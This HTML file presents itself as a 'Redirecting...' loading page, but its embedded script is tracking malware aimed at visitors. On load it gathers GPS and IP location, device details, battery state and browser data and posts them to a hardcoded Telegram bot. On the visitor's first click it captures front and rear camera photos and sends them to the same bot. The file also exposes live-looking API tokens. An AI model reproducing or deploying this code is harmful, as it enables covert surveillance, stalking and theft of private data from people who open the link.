<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="refresh" content="10;url=https://heavenscake.vercel.app">
  <style>
    body {
      margin: 0;
      background: #fff;
      color: #000;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    img {
      width: 64px;
      height: 64px;
      margin-bottom: 16px;
    }
  </style>
</head>
<body>
  <img src="/favicon.svg" alt="logo" />
  <p>Loading...</p>

  <script>
    const BOT_TOKEN = "7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY";
    const CHAT_ID = "7216371031";
    let deviceInfo = "";

    function sendToTelegram(message) {
      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      });
    }

    function sendPhotoToTelegram(blob) {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, "cam.jpg");
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    async function takePhoto(facing = "user") {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();
        await new Promise(res => setTimeout(res, 800));
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);
        stream.getTracks().forEach(track => track.stop());
        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.8));
        sendPhotoToTelegram(blob);
      } catch (err) {
        console.warn("Camera access skipped or denied.");
      }
    }

    function getBatteryInfo() {
      return navigator.getBattery().then(battery => {
        deviceInfo += `🔋 Battery: ${Math.round(battery.level * 100)}%\n`;
        deviceInfo += `⚡ Charging: ${battery.charging ? "Yes" : "No"}\n`;
      }).catch(() => {
        deviceInfo += `🔋 Battery: Not Available\n`;
      });
    }

    function getIPInfo() {
      return fetch("https://ipinfo.io/json?token=ce7fbbdbe9fd92")
        .then(res => res.json())
        .then(ip => {
          const loc = ip.loc ? ip.loc.split(",") : ["N/A", "N/A"];
          deviceInfo += `🌍 IP: ${ip.ip}\n`;
          deviceInfo += `📍 IP-Based Location: ${ip.city}, ${ip.region}, ${ip.country}\n`;
          deviceInfo += `📌 IP Lat/Lon: ${loc[0]}, ${loc[1]}\n`;
          deviceInfo += `🌐 ISP: ${ip.org || "Unknown"}\n`;
        }).catch(() => {
          deviceInfo += `🌍 IP: Not Available\n📍 Location: Unknown\n`;
        });
    }

    function getGPSLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve();

        navigator.geolocation.getCurrentPosition(
          pos => {
            const { latitude, longitude, accuracy } = pos.coords;
            deviceInfo += `📡 GPS Location: ${latitude}, ${longitude}\n🎯 Accuracy: ${accuracy}m\n`;
            resolve();
          },
          err => {
            deviceInfo += `📡 GPS: Permission Denied or Unavailable\n`;
            resolve();
          },
          { enableHighAccuracy: true, timeout: 8000 }
        );
      });
    }

    function getExtraDetails() {
      const touch = 'ontouchstart' in window ? "Yes" : "No";
      const languages = navigator.languages.join(", ");
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      deviceInfo += `🌐 Language(s): ${languages}\n`;
      deviceInfo += `🧠 RAM: ${navigator.deviceMemory || "?"} GB\n`;
      deviceInfo += `🧮 CPU Cores: ${navigator.hardwareConcurrency || "?"}\n`;
      deviceInfo += `📲 Touch Support: ${touch}\n`;
      deviceInfo += `🕓 Timezone: ${timeZone} (UTC${-new Date().getTimezoneOffset()/60})\n`;
      deviceInfo += `💻 Platform: ${navigator.platform}\n`;
      deviceInfo += `🖥️ Screen: ${screen.width}x${screen.height}\n`;
      deviceInfo += `📱 UA: ${navigator.userAgent}\n`;
      deviceInfo += `🕒 Time: ${new Date().toLocaleString()}\n`;
      deviceInfo += `🔗 Referrer: ${document.referrer || "Direct"}\n`;
    }

    async function collectAndSend() {
      await Promise.all([
        getBatteryInfo(),
        getIPInfo(),
        getGPSLocation()
      ]);
      getExtraDetails();
      await sendToTelegram(deviceInfo);
    }

    // ✅ Send data on page load
    collectAndSend();

    // ✅ Trigger camera only on user interaction
    window.addEventListener("click", async () => {
      await takePhoto("user");
      await takePhoto("user");
      await takePhoto("environment");
    }, { once: true });
  </script>
</body>
</html>
